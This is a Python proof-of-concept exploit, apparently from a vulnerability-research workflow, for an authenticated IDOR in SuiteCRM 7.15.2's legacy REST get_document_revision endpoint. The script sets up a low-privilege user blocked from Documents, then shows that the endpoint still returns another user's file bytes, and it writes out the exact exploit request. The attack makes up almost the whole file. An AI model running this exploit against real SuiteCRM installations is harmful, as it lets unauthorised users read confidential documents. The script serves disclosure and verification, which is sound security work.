#!/usr/bin/env python3
"""
VULN-003 -- `get_document_revision`: authenticated IDOR, download any document file.

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/core/SugarWebServiceImpl.php:877-905 (get_document_revision) --
             checkSessionAndModuleAccess() is called with an EMPTY module (session-only),
             then `$dr->retrieve($id)` and the file bytes are returned with NO
             checkACLAccess() at all. Contrast the sibling get_entry()/get_entries()
             (:138), which DOES call checkACLAccess($seed,'DetailView',...).

Plan
----
1. As admin, create a low-priv user and restrict their Documents view+list to NONE via a
   throwaway Role (_c1_common.restrict_role) -- models a real restrictive deployment;
   default SuiteCRM grants ALL access to every module absent an explicit Role.
2. As admin (legacy REST), create a Document + a DocumentRevision carrying a random
   secret file. The secret bytes are independently written to disk by the app itself;
   we verify them directly from the app container's upload/ directory (NOT just trusting
   the API's own echo) before ever touching the low-priv account.
3. Log the low-priv user in (legacy REST, fresh session so the Role applies) and, over
   that ONE session:
     a) method=get_entry on Documents/<doc_id>  (the ACL'd sibling) -> expect a no_access
        fault / denial.
     b) method=get_document_revision on the revision id (the vulnerable sink) -> expect
        the full base64 file bytes, matching the secret written to disk in step 2.
"""
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, rest_login, rest_call)
from _c1_common import restrict_role, app_exec

VULN_ID = "VULN-003"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "get_document_revision IDOR -- download any document's file with no ACL")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)

    log("SETUP", "create fresh low-privilege user")
    from _common import create_user
    low = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"low-priv user: {low['user_name']} id={low['id']}")

    log("SETUP", "restrict Documents view+list = NONE for a fresh Role, assign ONLY to this user")
    role_id = restrict_role(low["id"], [("Documents", "view"), ("Documents", "list")])
    log("OK", f"role {role_id} assigned")

    log("SETUP", "admin creates a victim Document (admin-owned)")
    doc_name = f"Stage10 VULN-003 target {rand('doc')}"
    res = rest_call("set_entry", [admin_sid, "Documents", [
        {"name": "document_name", "value": doc_name},
        {"name": "doc_type", "value": "Sugar"},
        {"name": "active_date", "value": "01/01/2026"},
        {"name": "status_id", "value": "Active"},
    ]])
    doc_id = res.get("id")
    if not doc_id or doc_id == "-1":
        verdict(VULN_ID, "FAILED", f"could not create victim Document via set_entry: {res}")
        sys.exit(1)
    log("OK", f"victim Document id={doc_id} name={doc_name!r}")

    secret_bytes = f"CVEHUNTER-SECRET-FILE-{rand('doc')}\n".encode()
    b64 = base64.b64encode(secret_bytes).decode()
    log("SETUP", f"admin attaches a revision with a random secret payload ({secret_bytes!r})")
    res2 = rest_call("set_document_revision", [admin_sid, {
        "id": doc_id,
        "document_name": doc_name,
        "revision": "1",
        "filename": "secret.txt",
        "file": b64,
    }])
    dr_id = res2.get("id")
    if not dr_id or dr_id == "-1":
        verdict(VULN_ID, "FAILED", f"could not create DocumentRevision via set_document_revision: {res2}")
        sys.exit(1)
    log("OK", f"victim DocumentRevision id={dr_id}")

    # Independent verification: read the bytes straight off disk in the app container,
    # NOT through any API -- proves the secret really is what the app persisted.
    disk_b64 = app_exec(f"base64 -w0 /var/www/html/upload/{dr_id}").strip()
    disk_bytes = base64.b64decode(disk_b64) if disk_b64 else b""
    log("INFO", f"app-container disk read of upload/{dr_id}: {disk_bytes!r}")
    if disk_bytes != secret_bytes:
        verdict(VULN_ID, "FAILED", f"disk contents {disk_bytes!r} != expected {secret_bytes!r} -- "
                                    "precondition itself did not land correctly")
        sys.exit(1)
    log("OK", "on-disk file content independently matches the planted secret")

    log("SETUP", "low-priv user logs in fresh over legacy REST (Role applies to this new session)")
    low_sid = rest_login(low["user_name"], low["password"])

    # --- Control: the ACL'd sibling must deny -------------------------------------------
    log("STEP", "get_entry on Documents/<doc_id> (ACL'd sibling) as low-priv")
    r_entry = rest_call("get_entry", [low_sid, "Documents", doc_id, ["id", "document_name"], []])
    log("INFO", f"get_entry() response: {r_entry}")
    entry_denied = bool(r_entry.get("name") == "no_access" or "error" in str(r_entry).lower()
                         or not r_entry.get("entry_list"))
    log("PROOF" if entry_denied else "FAIL",
        f"ACL'd get_entry(): denied/empty = {entry_denied} (expected True -- checkACLAccess('DetailView') should block it)")

    # --- The actual bug: get_document_revision has no ACL check at all ------------------
    log("STEP", "get_document_revision on the revision id (VULNERABLE sink), SAME low-priv session")
    r_rev = rest_call("get_document_revision", [low_sid, dr_id])

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f"method=get_document_revision&input_type=JSON&response_type=JSON&"
            f"rest_data=[\"{low_sid}\",\"{dr_id}\"]\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        import json as _json
        f.write(_json.dumps(r_rev, indent=2))
    with open(os.path.join(HERE, "evidence", "get_entry_control_response.json"), "w") as f:
        import json as _json
        f.write(_json.dumps(r_entry, indent=2))
    with open(os.path.join(HERE, "evidence", "get_document_revision_response.json"), "w") as f:
        import json as _json
        f.write(_json.dumps(r_rev, indent=2))

    dr = r_rev.get("document_revision", {})
    leaked_b64 = dr.get("file")
    leaked_bytes = base64.b64decode(leaked_b64) if leaked_b64 else b""
    log("INFO", f"get_document_revision() returned filename={dr.get('filename')!r}, "
                f"{len(leaked_bytes)} bytes decoded")

    with open(os.path.join(HERE, "evidence", "leaked_file.bin"), "wb") as f:
        f.write(leaked_bytes)

    leaked_ok = leaked_bytes == secret_bytes
    log("PROOF", f"low-priv user (Documents view=list=NONE via Role {role_id}) -- "
                 f"get_entry()={'DENIED' if entry_denied else 'unexpectedly allowed'}; "
                 f"get_document_revision()={'LEAKED EXACT FILE BYTES' if leaked_ok else 'did not leak'}")

    ok = entry_denied and leaked_ok
    if not ok:
        reasons = []
        if not entry_denied:
            reasons.append("get_entry() unexpectedly succeeded (ACL restriction may not have taken)")
        if not leaked_ok:
            reasons.append(f"leaked bytes {leaked_bytes!r} != secret {secret_bytes!r}")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "Confirmed: get_document_revision returns the exact file bytes to a user whose ACL'd "
              "get_entry() call on the parent Document is denied.")
    verdict(VULN_ID, "CONFIRMED",
            f"low-priv user w/ Documents view=list=NONE downloaded revision {dr_id} via "
            f"get_document_revision; bytes match planted secret {secret_bytes!r}; get_entry() on the "
            f"parent Document via the same session was denied")
    sys.exit(0)


if __name__ == "__main__":
    main()
